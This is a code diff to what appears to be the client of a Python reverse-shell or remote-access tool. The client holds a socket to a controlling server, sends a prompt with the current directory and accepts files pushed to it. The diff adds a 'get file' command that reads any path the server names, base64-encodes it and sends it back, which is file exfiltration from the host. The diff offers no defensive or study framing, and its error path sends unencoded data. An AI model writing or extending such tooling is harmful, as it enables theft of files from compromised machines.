@@ -4,7 +4,7 @@ import socket
 import subprocess
 import sys
 from os.path import expanduser, realpath
-from base64 import b64decode
+from base64 import b64decode, b64encode
 from time import sleep
 import threading
 
@@ -55,7 +55,7 @@ class Client(object):
         self.sock.send(str.encode(some_data + str(os.getcwd()) + '> ' + '~!_TERM_$~'))
         return self
 
-    def send_data(self, some_data, echo=True):
+    def send_data(self, some_data, echo=True, encode=True):
         """
         Send data to the server with the termination string appended.
 
@@ -65,7 +65,11 @@ class Client(object):
         """
         if echo:
             print('Sending Data:', some_data)
-        self.sock.send(str.encode(some_data + '~!_TERM_$~'))
+        if encode:
+            self.sock.send(str.encode(some_data + '~!_TERM_$~'))
+        else:
+            self.sock.send(some_data)
+            self.sock.send(str.encode('~!_TERM_$~'))
         return self
 
     def receive_data(self, echo=False, decode=True):
@@ -171,9 +175,9 @@ class Client(object):
         :return:
         """
 
-        print(upload_data)
         with open(upload_filename, 'wb') as f:
             f.write(b64decode(upload_data))
+        print('<', upload_filename, 'written...', '>')
         return
 
     def handle_file_upload(self, upload_data, upload_filename):
@@ -260,6 +264,17 @@ class Client(object):
                     if data == 'quit':
                         self.send_data('confirmed')
                         sleep(1)
+                        continue
+
+                    if data[:9] == 'get file ':
+                        try:
+                            with open(data[9:].strip(), 'rb') as f:
+                                data = b64encode(f.read())
+                                f.close()
+                        except FileNotFoundError as err_msg:
+                            self.send_data(str(err_msg))
+
+                        self.send_data(data, encode=False)
                         continue
 
                     # Handle setting the file upload name.
